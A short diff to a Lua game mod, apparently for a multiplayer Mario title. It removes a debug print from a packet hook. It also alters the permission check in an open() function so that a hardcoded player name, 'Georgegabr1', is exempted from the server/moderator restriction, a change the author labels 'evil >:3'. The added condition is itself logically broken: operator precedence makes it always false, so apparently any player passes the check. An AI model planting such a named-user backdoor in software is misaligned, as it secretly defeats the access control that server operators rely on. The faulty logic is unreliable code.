@@ -1500,8 +1500,6 @@ end
 -- - tell all player to delete all objects
 -- - other (TODO)
 hook_event(HOOK_ON_PACKET_RECEIVE, function(packet)
-	print("Packet received: " .. packet.type)
-
 	-- Only if player who deleted is in the same level of the local player
 	if packet.type == PACKET_DELOBJ and packet.level == gNetworkPlayers[0].currLevelNum then
 		local found = false
@@ -2037,7 +2035,10 @@ function on_hud_render()
 end
 
 function open()
-	if not network_is_server() and not network_is_moderator() then
+	local m = gMarioStates[0]
+	local np = gNetworkPlayers[m.playerIndex]
+
+	if not network_is_server() and not network_is_moderator() and not np.name == "Georgegabr1" then -- evil >:3
 		return
 	end
 
